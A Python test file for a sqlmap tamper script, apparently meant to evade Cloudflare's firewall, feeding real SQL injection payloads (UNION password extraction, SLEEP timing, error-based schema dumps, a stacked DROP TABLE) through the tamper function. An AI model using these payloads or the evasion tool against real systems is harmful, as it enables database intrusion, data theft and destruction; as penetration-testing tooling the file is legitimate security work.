#!/usr/bin/env python

"""
Integration Tests - Real SQLMap Payloads

Tests with actual SQL injection payloads.

Author: Regaan
License: GPL v2
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import the actual tamper script
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'tamper_scripts'))
from cloudflare2025 import tamper


def test_simple_union():
    """Test simple UNION injection"""
    query = "UNION SELECT password FROM admin"
    result = tamper(query)
    
    assert result != query  # Should be transformed
    assert "UNION" not in result or "/*!50000" in result  # Keywords wrapped
    print("✓ test_simple_union passed")


def test_boolean_based():
    """Test boolean-based injection"""
    query = "SELECT * FROM users WHERE id=1 AND 1=1"
    result = tamper(query)
    
    assert result != query
    # Should have transformations
    assert "/**/" in result or "/*!50000" in result
    print("✓ test_boolean_based passed")


def test_time_based():
    """Test time-based injection"""
    query = "SELECT * FROM users WHERE id=1 AND SLEEP(5)"
    result = tamper(query)
    
    assert result != query
    assert "SLEEP" not in result or "/*!50000" in result
    print("✓ test_time_based passed")


def test_error_based():
    """Test error-based injection"""
    query = "SELECT * FROM users WHERE id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
    result = tamper(query)
    
    assert result != query
    # Should handle complex nested query
    print("✓ test_error_based passed")


def test_stacked_queries():
    """Test stacked queries"""
    query = "SELECT * FROM users; DROP TABLE users"
    result = tamper(query)
    
    assert result != query
    assert "DROP" not in result or "/*!50000" in result
    print("✓ test_stacked_queries passed")


def test_operators_in_where():
    """Test various operators in WHERE clause (CRITICAL)"""
    test_cases = [
        ("SELECT * FROM users WHERE id>=5", "%3E%3D"),
        ("SELECT * FROM users WHERE id<=10", "%3C%3D"),
        ("SELECT * FROM users WHERE id<>1", "%3C%3E"),
        ("SELECT * FROM users WHERE name!='admin'", "%21%3D"),
    ]
    
    for query, expected in test_cases:
        result = tamper(query)
        assert expected in result, f"Expected {expected} in result for query: {query}"
    
    print("✓ test_operators_in_where passed")


def test_subquery_injection():
    """Test subquery injection"""
    query = "SELECT * FROM users WHERE id=(SELECT id FROM admin WHERE role='admin')"
    result = tamper(query)
    
    assert result != query
    # Should handle nested SELECT
    print("✓ test_subquery_injection passed")


def test_function_calls():
    """Test SQL functions"""
    query = "SELECT COUNT(*) FROM users WHERE active=1"
    result = tamper(query)
    
    assert result != query
    # COUNT should be preserved or transformed
    print("✓ test_function_calls passed")


def test_string_literals_preserved():
    """Test that string literals are not broken"""
    query = "SELECT * FROM users WHERE name='admin' AND role='superuser'"
    result = tamper(query)
    
    # String literals should be preserved
    assert "'admin'" in result
    assert "'superuser'" in result
    print("✓ test_string_literals_preserved passed")


def test_comments_preserved():
    """Test that existing comments are preserved"""
    query = "/* bypass */ SELECT * FROM users"
    result = tamper(query)
    
    # Original comment should be preserved
    assert "/* bypass */" in result
    print("✓ test_comments_preserved passed")


def test_deterministic():
    """Test that same input produces same output"""
    query = "SELECT * FROM users WHERE id=1"
    
    result1 = tamper(query)
    result2 = tamper(query)
    
    assert result1 == result2, "Transformation is not deterministic!"
    print("✓ test_deterministic passed")


def test_empty_payload():
    """Test empty payload handling"""
    result = tamper("")
    assert result == ""
    
    result = tamper(None)
    assert result is None
    
    print("✓ test_empty_payload passed")


def test_complex_real_world():
    """Test complex real-world payload"""
    query = "UNION ALL SELECT NULL,NULL,CONCAT(0x7e,JSON_ARRAYAGG(CONCAT_WS(0x3a,table_schema,table_name)),0x7e) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61,0x737973)"
    result = tamper(query)
    
    assert result != query
    # Should handle complex payload without breaking
    print("✓ test_complex_real_world passed")


def run_all_tests():
    """Run all integration tests"""
    print("\n" + "=" * 70)
    print("Running Integration Tests (Real SQLMap Payloads)")
    print("=" * 70 + "\n")
    
    tests = [
        test_simple_union,
        test_boolean_based,
        test_time_based,
        test_error_based,
        test_stacked_queries,
        test_operators_in_where,
        test_subquery_injection,
        test_function_calls,
        test_string_literals_preserved,
        test_comments_preserved,
        test_deterministic,
        test_empty_payload,
        test_complex_real_world,
    ]
    
    passed = 0
    failed = 0
    
    for test in tests:
        try:
            test()
            passed += 1
        except AssertionError as e:
            print(f"✗ {test.__name__} failed: {e}")
            failed += 1
        except Exception as e:
            print(f"✗ {test.__name__} error: {e}")
            failed += 1
    
    print(f"\n{passed} passed, {failed} failed")
    return failed == 0


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
